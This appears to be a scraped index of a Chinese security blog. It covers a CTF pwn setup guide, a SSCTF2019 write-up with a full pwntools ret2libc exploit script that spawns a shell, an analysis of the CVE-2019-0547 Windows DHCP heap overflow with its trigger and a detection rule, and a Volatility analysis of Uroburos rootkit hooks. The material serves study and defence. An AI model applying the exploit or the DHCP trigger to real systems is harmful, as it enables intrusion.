gdb $1 $2 $3 $4 $5 $6 $7 $8 $9 现在我们把这个shell脚本放到一个环境变量指向的路径里面，查看一下自己的路径，shell脚本放进去 echo $PATH 我放在了/usr/local/sbin目录下，这样就可以执行 gdb.sh，输入对应插件的数字就可以选择使用哪个插件，无需手动更改.gdbinit文件。 实在不会可以参考这位师傅的教程：自动选择gdb插件 32位程序支持 必备，装它。 apt-get install libc6-dev-i386 qemu 这是arm的pwn环境，前期可以不安装，但是终究是逃不过的，建议一步到位。 安装qemu： sudo apt-get install qemu sudo apt-get install qemu-system qemu-user-static binfmt-support 安装依赖库： sudo apt-get install -y gcc-arm-linux-gnueabi sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git LibcSearcher 泄露libc库中函数的偏移的库，建议安装，可以节省时间，提高效率。 安装LibcSearcher： sudo pip install capstone git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher python setup.py develop ROPgadget和one_gadget ROPgadget是用来找gadget的，one_gadget用来寻找libc库中的execve('/bin/sh', NULL, NULL)可以一个gadget就可以getshell，建议安装。 安装ROPgadget： # 先安装Capstone,它是一个轻量级的多平台架构支持的反汇编架构。 sudo apt-get install python-capstone 然后，下载好ROPgadget解压进入文件夹中 python setup.py install 安装one_gadget： sudo apt install ruby gem install one_gadget IDA 静态调试必备，不多解释。这里建议安装52上的版本： 52上的IDA ","date":"2020-02-05","objectID":"/ctf/pwn/:4:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"四、总结 整理这篇文章的目的是希望在玩Pwn的时候可以不用花太多时间在环境上，搭配好一套环境一直用就好了，根据具体情况再进行补充。还是那句话，重心还是要放在技术本身上。 ","date":"2020-02-05","objectID":"/ctf/pwn/:5:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"这道题还是很好玩的，考点也比较丰富，特此总结学习。","date":"2019-10-27","objectID":"/ctf/roarctf/","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"SSCTF2019 PWN题题解 ","date":"2019-10-27","objectID":"/ctf/roarctf/:0:0","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"stackpwn 首先file,checsec走一遍，64位程序，动态链接，开了NX IDA直接看，main函数： 进入vuln看一下： 容易看出，存在溢出点，且v1到返回地址的距离为(0x10 + 0x8 = 0x18)。 到此为止，我们大致明白了程序的流程：通过vuln函数进行栈溢出，但是程序没有给出system函数，所以需要我们进行两次利用，第一次利用进行地址泄漏，需要使用ROP，第二次真实进行攻击。 基本思路是首先泄漏出puts函数的实际地址（因为在main函数和溢出之前都使用过了，所以程序内存中存在puts函数的真实地址.使用pop rdi;ret将got表中的存放的puts函数的真实地址利用plt表中的puts函数打印出来，我泄漏我自己），然后泄漏libc的基地址，然后获取system函数的实际地址（libc基地址+system偏移地址）；程序中有/bin/sh字符串，所以直接用就可以了。 ","date":"2019-10-27","objectID":"/ctf/roarctf/:1:0","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"Exp： from pwn import * context.log_level = 'debug' p = process('./stackpwn') offset = 0x18 #0x10+0x8 pop_rdi_ret = 0x0000000000400933 #ROPgadet : rdi bin_sh = 0x0000000000400954 # address of /bin/sh elf = ELF(\"./stackpwn\") libc = elf.libc # leak libc payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address p.recvuntil(\"instructions...\\n\") p.sendline(payload) #get puts address puts_addr = u64(p.recv(6).ljust(8,'\\x00')) #get libc address puts_base = libc.symbols['puts'] libc_base = puts_addr - puts_base #get system address sys_addr = libc_base + libc.symbols['system'] #second loop payload2 = 'A'*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr) p.sendline(payload2) p.interactive() ","date":"2019-10-27","objectID":"/ctf/roarctf/:1:1","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["Tech"],"content":"CVE-2019-0547 Microsoft Windows DHCP Client 代码执行漏洞分析","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞描述 CVE-2019-0547，一个Windows系统下DHCP客户端的任意代码执行漏洞，漏洞的主要原因是对DHCP消息的错误的处理方式造成内存损坏。攻击者可以通过构造恶意的DHCP响应数据包到存在漏洞的系统中来触发漏洞，最终可以实现以管理员权限执行任意代码，危害巨大。 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:1","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞影响范围 • Microsoft Windows10 version1803 • Microsoft Windows Serverversion 1803(ServerCoreInstallation) 该漏洞影响的系统版本只有两个，但是随着系统版本迭代，现在使用Windows 10的人越来越多，这个漏洞还是需要关注的。 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:2","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞基本信息 漏洞触发文件：DHCP服务主机上运行的dcpcore.dll 漏洞触发函数：dhcpcore!DecodeDomainSearchListData() 漏洞触发数据对象：一个原本用于存储域搜索结果的堆缓冲区 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:3","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞分析 基础知识 动态主机配置协议(DHCP)，主要用于集中管理和自动化网络上IP地址的分配。 它是BOOTP协议的扩展。 除了IP地址分配外，DHCP客户端还从DHCP服务器接收管理其网络配置所需的信息，包括子网掩码，网关地址，DNS服务器地址等。 DHCP使用UDP端口67和68进行通信。 DHCP在所有现代操作系统上都是标准的-并且默认情况下已对网络接口启用-在Microsoft Windows上。 典型的DHCP事务流程如下： client发送DHCP DISCOVER到server server发送DHCP OFFER到client client发送DHCP REQUEST到server server响应一个DHCP ACK到client 总结上面的过程，DHCP的工作方式如下：在客户端获取IP地址之前，它会在本地网络上广播DHCP DISCOVER消息。 本地网络上的任何DHCP服务器都可以使用DHCP OFFER响应，其中包含分配给客户端的IP地址。 该IP地址通常是租用的，这意味着它会在一定时间后过期。为了续订租约，客户端向DHCP服务器发送单播DHCP REQUEST消息。 DHCP服务器以DHCP ACK消息响应。 所有DHCP message均以通用的报头结构开头。所有多字节值均以网络字节顺序排列。 该结构描述如下[1]： offset size value 0x0000 1 Operation code (1 - request, 2 - response) 0x0001 1 Hardware type (1 - Ethernet) 0x0002 1 Hardware address length (usually 6 for Ethernet) 0x0003 1 Hops 0x0004 4 Transaction ID 0x0008 2 Time since client started 0x000A 2 Flags 0x000C 4 Client IP address if assigned 0x0010 4 Client IP address 0x0014 4 Next server IP address 0x0018 4 Relay IP address 0x001C 16 Client hardware address 0x002C 64 Server hostname (optional) 0x006C 128 Boot file name 0x00EC 4 Magic cookie (0x63 0x82 0x53 0x63) 0x00F0 variable Options 通用标头的长度是固定的，但是后面可以跟可变长度的DHCP选项。 每个单独的DHCP选项具有以下格式： Offset Size Value 0000 1 Option tag 0001 1 Option length (len) 0002 len Option data 除了IP地址（包含在“客户端IP地址”字段中）之外，DHCP message还使用“option”来包括其他几个配置参数，例如“子网掩码”（option tag：1），“路由器”（option tag：3），DNS服务器（option tag：6），NTP服务器（option tag：4），域搜索（option tag：119）。 有关标准option tag的列表，请参见[3]。 该漏洞主要与“域搜索”选项有关，该选项包含一个或多个DNS后缀，如果DNS名称不能自行解析，则客户端可以使用该后缀附加到DNS名称。 例如，考虑将分发“example.com”的DHCP服务器作为域搜索DNS后缀。 如果客户端向DNS查询“foo”，但没有收到任何DNS记录，则它将继续查询“foo.example.com”。使用此功能可避免对网络内的所有主机重复使用通用组织DNS后缀。 域搜索选项的选项数据字段包含wire format的DNS名称列表。DNS名称对一个或多个DNS标签进行编码，并以终止于零的字符结尾。DNS标签可以压缩或不压缩。未压缩的DNS标签是一字节长度的前缀的八位字节字符串。压缩标签是一个两字节的无符号整数值，其前两个最高有效位设置为1，其余位以字节为单位存储偏移量。因此，单个DNS名称可能由压缩和未压缩标签混合组成。DNS根目录“.”由单字节“\\x00”表示。使用未压缩的名称编码DNS名称“example.example.com”将变成“ \\x07example\\x07example\\x03com\\x00”。可以使用压缩标签将其编码如下：“\\x07example\\xc0\\x00\\x03com\\x00”。有关DNS名称的更多信息，请参见[2]。 原理分析 在Windows的DHCP客户端中存在越界写漏洞。DHCP客户端在启动时作为svchost.exe服务运行，并遵循DHCP协议来获取系统上网络接口的IP地址。当收到DHCP答复时，它将使用dhcpcore解析DHCP选项！ DhcpExtractFullOptions()，当遇到域搜索选项（option tag：119）时，该调用再调用dhcpcore！DecodeDomainSearchListData()。此函数主要将wire format的DNS名称转换为基于文本的DNS名称。它遍历每个DNS名称，在堆上分配内存，解压缩遇到的任何标签，并使用memcpy()复制标签，并在标签之间插入“.”，名称之间插入\",\"。用于存储DNS名称的已分配缓冲区大小是基于长度的字符串，并且由于DNS名称以空值结尾，因此缓冲区大小比DNS名称小1。因此，DNS名称“\\x07example\\x03com\\x00”导致缓冲区大小为12（请注意，字符串的长度为13）。如果DHCP回复消息包含前两个字节为零的域搜索选项，则调用程序函数将它们视为两个不同名称的两个以空字符结尾的字符，并将大小为0传递给dhcpcore！DecodeDomainSearchListData()，该函数将无法正确验证，而是调用HeapAlloc分配0字节的缓冲区。然后，它继续处理两个根标签，并写入无效缓冲区，从而导致越界写入。 攻击者可以设置一个恶意的DHCP服务器并使用恶意的DHCP响应消息来响应同一网段中的DHCP请求，从而利用该漏洞。 代码分析 分析使用的dhcpcore.dll版本为10.0.17134.191。 ; dhcpcore!DecodeDomainSearchListData: 6ffcb0cc 8bff mov edi,edi 6ffcb0ce 55 push ebp 6ffcb0cf 8bec mov ebp,esp 6ffcb0d1 83ec2c sub esp,2Ch 6ffcb0d4 8bc2 mov eax,edx 6ffcb0d6 894de4 mov dword ptr [ebp-1Ch],ecx 6ffcb0d9 8bc8 mov ecx,eax 6ffcb0db 8945f0 mov dword ptr [ebp-10h],eax 6ffcb0de 53 push ebx 6ffcb0df 8b5d0c mov ebx,dword ptr [ebp+0Ch] 6ffcb0e2 33d2 xor edx,edx 6ffcb0e4 c1e902 shr ecx,2 6ffcb0e7 83c164 add ecx,64h 6ffcb0ea 56 push esi 6ffcb0eb 33f6 xor esi,esi 6ffcb0ed 894dd4 mov dword ptr [ebp-2Ch],ecx 6ffcb0f0 8b4df0 mov ecx,dword ptr [ebp-10h] 6ffcb0f3 83f802 cmp eax,2 6ffcb0f6 57 push edi 6ffcb0f7 8b7d14 mov edi,dword ptr [ebp+14h] 6ffcb0fa 1bc0 sbb eax,eax 6ffcb0fc 40 inc eax 6ffcb0fd 8907 mov dword ptr [edi],eax ; 外层循环开始 6ffcb0ff 833f00 cmp dword ptr [edi],0 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx ; edx是计数器 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx ; 第一次迭代时跳过HeapFree 6ffcb10c 83fa02 cmp edx,2 6ffcb0fd 8907 mov dword ptr [edi],eax 6ffcb0ff 833f00 cmp dword ptr [edi],0 ; 第二次迭代, HeapFree and HeapAlloc都发生了. 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx 6ffcb10c 83fa02 cmp edx,2 6ffcb10f 7533 jne dhcpcore!DecodeDomainSearchListData+0x78 6f","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:4","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"检测思路 首先要监听UDP的67/68端口的流量。检测设备可以根据DHCP Magic Cookie值\\x63\\x82\\x53\\x63来判断是否为DHCP消息。 如果操作码为2，则检测设备必须解析每个DHCP选项，并检查option tag设置为0x77的所有选项的选项数据。如果发现任何此类选项的选项数据以“\\x00\\x00”开头，则应将流量视为可疑的攻击流量。 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:5","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"总结 这个分析思路很清楚，基本上是一个漏洞响应的微缩过程，到最后给出解决方案，个人感觉比较成熟。最后的流量检测现在很多的防火墙都可以实现，从流量侧拦截攻击好过主机防御。 参考文献 [1] RFC 2131, Dynamic Host Configuration Protocol https://tools.ietf.org/html/rfc2131 [2] P. Mockapetris, RFC 1035: DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION, https://tools.ietf.org/html/rfc1035 [3] IANA, Dynamic Host Configuration Protocol (DHCP)and Bootstrap Protocol (BOOTP) Parameters, https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:1:0","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"A simple analyse of Uroburos Rootkit","date":"2019-10-24","objectID":"/2019/10/rootkit/","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"Uroburos Rootkit中的HOOK的简单分析以及驱动的提取 Uroburos是一个rootkit，由两个文件，一个驱动程序和一个加密的虚拟文件系统组成。它可以窃取信息（最著名的是：文件），还可以捕获网络流量。它的模块化结构使其可以轻松扩展新功能，这不仅使其非常复杂，而且具有很高的灵活性和危险性。Uroburos的驱动程序部分非常复杂，并且设计得非常离散且很难识别。 本文章的分析基于BAE Systems的report以及spresec的博客，使用的样本为626576e5f0f85d77c460a322a92bb267，使用的主要工具为volatility（rekall也可以）。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:0:0","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"Hook分析 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:0","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"查找函数hook 根据BAE Systems的report，该rootkit对IoCreateDevice()函数进行了hook。我们通过一个受该rootkit映像的image来对该hook进行分析。 使用volatility的enumfunc插件来列举出所有导出函数的内存地址： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 enumfunc -K -E | grep IoCreateDevice Volatility Foundation Volatility Framework 2.3.1 \u003cKERNEL\u003e Export ntoskrnl.exe 340 0x000000008056aad6 IoCreateDevice 使用volshell来查看该函数是如何被hook的： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 volshell Volatility Foundation Volatility Framework 2.3.1 Current context: process System, pid=4, ppid=0 DTB=0x334000 Welcome to volshell! Current memory image is: ./uroburos_mod.vmem To get help, type 'hh()' \u003e\u003e\u003e dis(0x000000008056aad6) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX 从上面的结果可以看出，0x1被压入栈中，然后INT 0xc3执行一个中断。我们进一步跟进这个中断，看一下它的具体信息。 使用idt查看一下IDT： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.mem --profile=WinXPSP3x86 idt Volatility Foundation Volatility Framework 2.3.1 CPU Index Selector Value Module Section ------ ------ ---------- ---------- -------------------- ------------ [snip] 0 BC 0x8 0x8053d0b8 ntoskrnl.exe .text 0 BD 0x8 0x8053d0c2 ntoskrnl.exe .text 0 BE 0x8 0x8053d0cc ntoskrnl.exe .text 0 BF 0x8 0x8053d0d6 ntoskrnl.exe .text 0 C0 0x8 0x8053d0e0 ntoskrnl.exe .text 0 C1 0x8 0x806d1984 hal.dll .text 0 C2 0x8 0x8053d0f4 ntoskrnl.exe .text 0 C3 0x8 0x896a3670 UNKNOWN 0 C4 0x8 0x8053d108 ntoskrnl.exe .text 0 C5 0x8 0x8053d112 ntoskrnl.exe .text 0 C6 0x8 0x8053d11c ntoskrnl.exe .text 0 C7 0x8 0x8053d126 ntoskrnl.exe .text 0 C8 0x8 0x8053d130 ntoskrnl.exe .text [snip] 在上面的结果中，我们可以发现，INT 0xc3处理的中断位于一个名为“UNKNOWN”的模块中。无法正确识别出来这是不是系统模块，说明确实有问题。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:1","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"修改volatility的apihooks插件 通过前面几步操作，我们可以确认hook的地址。但是需要更多的信息，最好是能看到hook的具体操作内容和流程。因为volatility的原生apihooks.py是不支持内联中断hook的，所以需要对原生插件做一个改进。 原生apihooks.py中有个check_inline()函数，可以看到其代码是典型的内联hook的逻辑，该内联hook在当前模块，无条件的jmps，push/ret等的外部寻找调用。不幸的是，该rootkit没有使用任何这些方法。 在修改了一些代码之后，添加了以下逻辑来处理内联中断hook： elif op.flowControl == \"FC_INT\" and idt: # Clear the push value if push_val: push_val = None # Check for INT, ignore INT3 if op.mnemonic == \"INT\" and op.size \u003e 1 and op.operands[0].type == 'Immediate': # Check interrupt handler address d = idt[op.operands[0].value] if d and outside_module(d): break 将修改后的插件合入volatility，然后重新运行： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 apihooks -P Volatility Foundation Volatility Framework 2.3.1 ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IoCreateDevice at 0x8056aad6 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX 0x8056aae9 8b4508 MOV EAX, [EBP+0x8] 0x8056aaec 89 DB 0x89 0x8056aaed 45 INC EBP Disassembly(1): 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IofCallDriver at 0x804ee120 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x804ee120 6a00 PUSH 0x0 0x804ee122 cdc3 INT 0xc3 0x804ee124 90 NOP 0x804ee125 90 NOP [snip] ok，这次没有问题了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:2","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"Hook的详细分析 到现在为止，我们可以跟深入跟踪处理hook的指令进行更详细的分析了。重新使用volshell插件来看一下处理IoCreateDevice()的hook的具体函数： \u003e\u003e\u003e dis(0x000000008056aad6, 0xb) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 \u003e\u003e\u003e dis(0x896a3670, 0x18) 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF \u003e\u003e\u003e dis(0x896a3688, 0x29) 0x896a3688 fb STI 0x896a3689 50 PUSH EAX 0x896a368a 51 PUSH ECX 0x896a368b 0fb6442414 MOVZX EAX, BYTE [ESP+0x14] 0x896a3690 8b4c2418 MOV ECX, [ESP+0x18] 0x896a3694 894c2414 MOV [ESP+0x14], ECX 0x896a3698 8b0d506c6c89 MOV ECX, [0x896c6c50] 0x896a369e 8d04c1 LEA EAX, [ECX+EAX*8] 0x896a36a1 8b4804 MOV ECX, [EAX+0x4] 0x896a36a4 894c2418 MOV [ESP+0x18], ECX 0x896a36a8 59 POP ECX 0x896a36a9 8b00 MOV EAX, [EAX] 0x896a36ab 870424 XCHG [ESP], EAX 0x896a36ae c20c00 RET 0xc \u003e\u003e\u003e dd(0x896c6c50, 1) 896c6c50 89a2d800 \u003e\u003e\u003e dd(0x89a2d800+1*8, 1) 89a2d808 8963a020 \u003e\u003e\u003e dis(0x8963a020, 0xb) 0x8963a020 55 PUSH EBP 0x8963a021 8bec MOV EBP, ESP 0x8963a023 83ec18 SUB ESP, 0x18 0x8963a026 e875fd0100 CALL 0x89659da0 现在我们找到了处理hook的详细的函数代码，我们可以将内存导出，然后使用IDA进行分析。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:3","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"导出驱动 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:0","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"追踪内存中的驱动 我们直接使用volatility的modlist插件，并没有发现任何有价值的消息。之前为rootkit驱动程序确定的内存空间中似乎没有模块。我们注意到驱动程序似乎占用了很大的内存空间，我们可以从目前为止确定的最低地址开始向后搜索内存。寻找PE头，以0x8963a020为起点，向后看0x6000字节。 \u003e\u003e\u003e db(0x8963a020-0x6000, 0x6000) 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... [snip] 在上面的结果中，我们看到了DOS头，然后往前看一点，去寻找“MZ”： \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 00 00 00 00 03 00 00 00 04 00 00 00 ff ff 00 00 ................ 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... 奇怪的是“MZ”和“PE”的魔术字都没有找到，这意味moddump插件可能存在问题，需要进行修改。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:1","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"修补内存 volatility有个patcher插件可以处理这种情况。我们首先要写一个xml文件来修补PE头： 这将在每个页面边界的起始位置搜索我们在内存中找到的驱动程序的开始字节，并为结构正确的PE头插入魔术字。 $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 patcher -w -x patchdriver.xml Volatility Foundation Volatility Framework 2.3.1 Write support requested. Please type \"Yes, I want to enable write support\" below precisely (case-sensitive): Yes, I want to enable write support Calibrating for speed: Reading patch locations per page Patching Fix Driver MZ Header at page 9634000 看起来没有问题，我们检查一下： \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 50 45 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 PE..L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... OK,这次就没有问题了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:2","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"转储驱动程序 现在PE结构已经修复了，我们可以从内存中将驱动程序转储出来： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 moddump -b 0x89634000 -D . Volatility Foundation Volatility Framework 2.3.1 Module Base Module Name Result ----------- -------------------- ------ 0x089634000 UNKNOWN OK: driver.89634000.sys 这里需要注意的是，我们使用moddump插件进行内存转储时，并没有修复ImageBase，所以需要我们进行手动修复。这里可以使用pefile库： \u003e\u003e\u003e import pefile 